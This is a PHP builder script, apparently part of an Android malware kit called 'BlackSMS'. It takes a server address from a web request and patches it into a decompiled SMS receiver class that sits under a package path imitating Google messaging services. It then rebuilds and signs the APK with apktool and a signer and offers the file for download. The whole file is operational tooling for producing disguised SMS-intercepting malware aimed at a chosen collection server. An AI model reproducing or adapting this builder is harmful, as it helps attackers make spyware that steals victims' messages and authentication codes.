<?php

$smali_file_path = "./decompiled-apk/smali/com/android/google/messaging/services/receivers/MyReceiver.smali";
$apktool_path = "./jar/apktool.jar";
$apk_signer_path = "./jar/signer.jar";
$apk_building_log_path = "./apk-building.log";

if(!isset($_REQUEST['server-address'])){
    http_response_code(403);
    die('Error 403');
}

$new_server = trim($_REQUEST['server-address']);

if (filter_var($new_server, FILTER_VALIDATE_URL) == false) {
    echo $new_server . "<br>";
    die('Invalid server address.');
}

if(!file_exists($smali_file_path)){
    die("Smali file does not exist.");
}

if (file_exists("./BlackSMS.apk")) {
    unlink("./BlackSMS.apk");

    if (file_exists("./BlackSMS-aligned-debugSigned.apk")) {
        unlink("./BlackSMS-aligned-debugSigned.apk");
    }
}

$old_smali_codes = @file_get_contents($smali_file_path);

$last_server = trim(getStringBetween($old_smali_codes, '"http', '"'));
$last_server = 'http' . $last_server;

if ($last_server == "") {
   die("Failed to build apk. Something go wrong.");
}

$new_smali_codes = str_replace($last_server, $new_server, $old_smali_codes);

if(@file_put_contents($smali_file_path, $new_smali_codes)){

    $building_log1 = shell_exec("java -jar " . $apktool_path . " b decompiled-apk -o BlackSMS.apk 2>&1");

    if (file_exists("BlackSMS.apk")) {

        $building_log2 = shell_exec("java -jar " . $apk_signer_path . " -a BlackSMS.apk 2>&1");
        
        $apk_building_log = fopen($apk_building_log_path, "w") or die("Unable to store logs.");

        $final_log = $building_log1 . "\n" . $building_log2;

        @file_put_contents($apk_building_log_path, $final_log);

        echo "<center><a href='" . $apk_building_log_path . "'>See Logs</a><br><br><a href='./BlackSMS-aligned-debugSigned.apk'>Download Apk</a></center><br><pre>" . $final_log . "</pre>";
        echo "<script>window.open('./BlackSMS-aligned-debugSigned.apk', '_blank');</script>";
    }
    else{
        die("Somthing wrong.");
    }
}
else{
    die("Failed to build apk.");
}


// ---------------------------------------------------------

function getStringBetween($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}